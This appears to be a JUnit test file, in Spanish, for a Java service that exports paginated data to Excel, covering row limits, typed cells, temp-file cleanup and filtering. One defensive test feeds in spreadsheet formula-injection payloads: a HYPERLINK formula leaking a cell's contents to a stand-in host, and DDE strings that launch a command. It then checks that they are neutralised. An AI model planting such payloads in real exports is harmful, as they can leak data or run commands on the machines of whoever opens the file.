package com.planta.acopio.excel;

import com.planta.acopio.exception.ValidacionNegocioException;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.DateUtil;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;
import org.springframework.data.domain.PageImpl;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigDecimal;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class ExportacionExcelServiceTest {

    private record Fila(String nombre, BigDecimal litros, LocalDate fecha, LocalDateTime fechaHora, Boolean activo) {
    }

    private static final List<ColumnaExcel<Fila>> COLUMNAS = List.of(
            ColumnaExcel.texto("Nombre", Fila::nombre),
            ColumnaExcel.decimal("Litros", Fila::litros),
            ColumnaExcel.fecha("Fecha", Fila::fecha),
            ColumnaExcel.fechaHora("Fecha y hora", Fila::fechaHora),
            ColumnaExcel.siNo("Activo", Fila::activo));

    private ExportacionExcelService servicio(int maxFilas, int lote) {
        return new ExportacionExcelService(new LimitesExcel(maxFilas, lote, 2_097_152, 2_000, 10_000, 100, 26_214_400, 30));
    }

    private static List<Fila> filas(int cantidad) {
        List<Fila> lista = new ArrayList<>();
        for (int i = 0; i < cantidad; i++) {
            lista.add(new Fila("Proveedor " + i, new BigDecimal("12.50").add(BigDecimal.valueOf(i)),
                    LocalDate.of(2026, 10, 1).plusDays(i % 20), LocalDateTime.of(2026, 10, 1, 8, 30), i % 2 == 0));
        }
        return lista;
    }

    private static Sheet leer(ArchivoExcel archivo, XSSFWorkbook[] cierre) throws IOException {
        try (InputStream in = Files.newInputStream(archivo.ruta())) {
            cierre[0] = new XSSFWorkbook(in);
        }
        return cierre[0].getSheetAt(0);
    }

    private static long temporalesPropios() throws IOException {
        try (Stream<Path> s = Files.list(Path.of(System.getProperty("java.io.tmpdir")))) {
            return s.filter(p -> p.getFileName().toString().startsWith("ecolacteos-xlsx-")).count();
        }
    }

    @Test
    void exportaTodasLasPaginasNoSoloLaPrimera() throws Exception {
        List<Fila> todas = filas(1234);
        AtomicInteger consultas = new AtomicInteger();

        ArchivoExcel archivo = servicio(5000, 500).exportar("prueba", "Proveedores", COLUMNAS, pageable -> {
            consultas.incrementAndGet();
            int desde = (int) pageable.getOffset();
            int hasta = Math.min(desde + pageable.getPageSize(), todas.size());
            return new PageImpl<>(todas.subList(desde, hasta), pageable, todas.size());
        });
        XSSFWorkbook[] libro = new XSSFWorkbook[1];
        try {
            Sheet hoja = leer(archivo, libro);
            assertThat(consultas.get()).isEqualTo(3); // 500 + 500 + 234
            assertThat(archivo.filas()).isEqualTo(1234);
            assertThat(hoja.getLastRowNum()).isEqualTo(1234); // encabezado + 1234 filas
            assertThat(hoja.getSheetName()).isEqualTo("Proveedores");
            assertThat(hoja.getRow(0).getCell(0).getStringCellValue()).isEqualTo("Nombre");
            assertThat(hoja.getRow(1).getCell(0).getStringCellValue()).isEqualTo("Proveedor 0");
            assertThat(hoja.getRow(1234).getCell(0).getStringCellValue()).isEqualTo("Proveedor 1233");
            assertThat(archivo.nombre()).startsWith("prueba-").endsWith(".xlsx");
        } finally {
            libro[0].close();
            archivo.descartar();
        }
    }

    @Test
    void escribeCadaValorConSuTipoReal() throws Exception {
        ArchivoExcel archivo = servicio(100, 50).exportar("tipos", "Tipos", COLUMNAS, pageable ->
                new PageImpl<>(List.of(
                        new Fila("Ana", new BigDecimal("1234.5"), LocalDate.of(2026, 10, 5), LocalDateTime.of(2026, 10, 5, 9, 15), true),
                        new Fila("Beto", null, null, null, false)), pageable, 2));
        XSSFWorkbook[] libro = new XSSFWorkbook[1];
        try {
            Sheet hoja = leer(archivo, libro);
            Row ana = hoja.getRow(1);
            assertThat(ana.getCell(1).getCellType()).isEqualTo(CellType.NUMERIC);
            assertThat(ana.getCell(1).getNumericCellValue()).isEqualTo(1234.5);
            assertThat(DateUtil.isCellDateFormatted(ana.getCell(2))).isTrue();
            assertThat(ana.getCell(2).getLocalDateTimeCellValue().toLocalDate()).isEqualTo(LocalDate.of(2026, 10, 5));
            assertThat(ana.getCell(3).getLocalDateTimeCellValue()).isEqualTo(LocalDateTime.of(2026, 10, 5, 9, 15));
            assertThat(ana.getCell(4).getStringCellValue()).isEqualTo("Sí");
            Row beto = hoja.getRow(2);
            assertThat(beto.getCell(1).getCellType()).isEqualTo(CellType.BLANK);
            assertThat(beto.getCell(2).getCellType()).isEqualTo(CellType.BLANK);
            assertThat(beto.getCell(4).getStringCellValue()).isEqualTo("No");
        } finally {
            libro[0].close();
            archivo.descartar();
        }
    }

    @Test
    void neutralizaFormulasYNuncaEscribeCeldasDeFormula() throws Exception {
        List<Fila> maliciosas = List.of(
                new Fila("=HYPERLINK(\"http://malo.example/?c=\"&A1,\"clic\")", BigDecimal.ONE, null, null, true),
                new Fila("+cmd|' /C calc'!A0", BigDecimal.ONE, null, null, true),
                new Fila("@SUM(1+1)", BigDecimal.ONE, null, null, true),
                new Fila("-2+3+cmd|' /C calc'!A0", BigDecimal.ONE, null, null, true),
                new Fila("Normal", BigDecimal.ONE, null, null, true));
        ArchivoExcel archivo = servicio(100, 50).exportar("mal", "Mal", COLUMNAS,
                pageable -> new PageImpl<>(maliciosas, pageable, maliciosas.size()));
        XSSFWorkbook[] libro = new XSSFWorkbook[1];
        try {
            Sheet hoja = leer(archivo, libro);
            assertThat(hoja.getRow(1).getCell(0).getStringCellValue()).startsWith("'=HYPERLINK");
            assertThat(hoja.getRow(2).getCell(0).getStringCellValue()).startsWith("'+cmd");
            assertThat(hoja.getRow(3).getCell(0).getStringCellValue()).startsWith("'@SUM");
            assertThat(hoja.getRow(4).getCell(0).getStringCellValue()).startsWith("'-2+3");
            assertThat(hoja.getRow(5).getCell(0).getStringCellValue()).isEqualTo("Normal");
            for (Row fila : hoja) {
                for (Cell celda : fila) {
                    assertThat(celda.getCellType()).as("celda %s", celda.getAddress()).isNotEqualTo(CellType.FORMULA);
                }
            }
        } finally {
            libro[0].close();
            archivo.descartar();
        }
    }

    @Test
    void rechazaUnaConsultaMasGrandeQueElTopeSinDejarArchivos() throws Exception {
        long antes = temporalesPropios();
        List<Fila> muchas = filas(101);

        assertThatThrownBy(() -> servicio(100, 50).exportar("grande", "Grande", COLUMNAS, pageable -> {
            int desde = (int) pageable.getOffset();
            int hasta = Math.min(desde + pageable.getPageSize(), muchas.size());
            return new PageImpl<>(muchas.subList(desde, hasta), pageable, muchas.size());
        }))
                .isInstanceOf(ValidacionNegocioException.class)
                .hasMessageContaining("101")
                .hasMessageContaining("100")
                .hasMessageContaining("filtros");

        assertThat(temporalesPropios()).isEqualTo(antes);
    }

    @Test
    void siFallaLaConsultaAMitadNoQuedaUnArchivoMedioHecho() throws Exception {
        long antes = temporalesPropios();
        List<Fila> todas = filas(300);
        AtomicInteger llamadas = new AtomicInteger();

        assertThatThrownBy(() -> servicio(1000, 100).exportar("falla", "Falla", COLUMNAS, pageable -> {
            if (llamadas.incrementAndGet() == 2) {
                throw new IllegalStateException("la base de datos se cayo");
            }
            int desde = (int) pageable.getOffset();
            int hasta = Math.min(desde + pageable.getPageSize(), todas.size());
            return new PageImpl<>(todas.subList(desde, hasta), pageable, todas.size());
        })).isInstanceOf(IllegalStateException.class);

        assertThat(temporalesPropios()).isEqualTo(antes);
    }

    @Test
    void leerElArchivoLoBorraDelDisco() throws Exception {
        ArchivoExcel archivo = servicio(100, 50).exportar("una-vez", "Una vez", COLUMNAS,
                pageable -> new PageImpl<>(filas(3), pageable, 3));
        assertThat(Files.exists(archivo.ruta())).isTrue();

        try (InputStream in = archivo.abrir()) {
            assertThat(in.readAllBytes()).hasSizeGreaterThan(1000);
        }

        assertThat(Files.exists(archivo.ruta())).isFalse();
    }

    @Test
    void unaTablaVaciaGeneraSoloElEncabezado() throws Exception {
        ArchivoExcel archivo = servicio(100, 50).exportar("vacia", "Vacia", COLUMNAS, pageable -> new PageImpl<>(List.of(), pageable, 0));
        XSSFWorkbook[] libro = new XSSFWorkbook[1];
        try {
            Sheet hoja = leer(archivo, libro);
            assertThat(archivo.filas()).isZero();
            assertThat(hoja.getLastRowNum()).isZero();
            assertThat(hoja.getRow(0).getCell(1).getStringCellValue()).isEqualTo("Litros");
        } finally {
            libro[0].close();
            archivo.descartar();
        }
    }

    @Test
    void exportarListaFiltraSinDistinguirMayusculasNiAcentos() throws Exception {
        List<Fila> lista = List.of(
                new Fila("Niño Pérez", BigDecimal.ONE, null, null, true),
                new Fila("Quispe", BigDecimal.TEN, null, null, true),
                new Fila("Huamán", BigDecimal.TEN, null, null, false));

        ArchivoExcel archivo = servicio(100, 50).exportarLista("lista", "Lista", COLUMNAS, lista, "NINO");
        XSSFWorkbook[] libro = new XSSFWorkbook[1];
        try {
            Sheet hoja = leer(archivo, libro);
            assertThat(archivo.filas()).isEqualTo(1);
            assertThat(hoja.getRow(1).getCell(0).getStringCellValue()).isEqualTo("Niño Pérez");
        } finally {
            libro[0].close();
            archivo.descartar();
        }

        ArchivoExcel sinBusqueda = servicio(100, 50).exportarLista("lista", "Lista", COLUMNAS, lista, "  ");
        assertThat(sinBusqueda.filas()).isEqualTo(3);
        sinBusqueda.descartar();
    }
}
